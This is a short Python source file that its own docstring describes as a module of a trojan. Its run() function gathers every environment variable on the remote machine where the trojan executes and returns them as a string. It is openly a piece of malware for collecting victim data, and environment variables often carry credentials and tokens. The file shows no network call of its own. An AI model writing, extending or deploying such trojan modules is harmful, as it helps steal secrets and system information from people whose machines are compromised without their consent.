#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
This module simply retrieves any environment variables that are set on
the remote machine on which the trojan is executing.
"""

import os

def run(**args):
    print("[*] In environment module.")
    return str(os.environ)
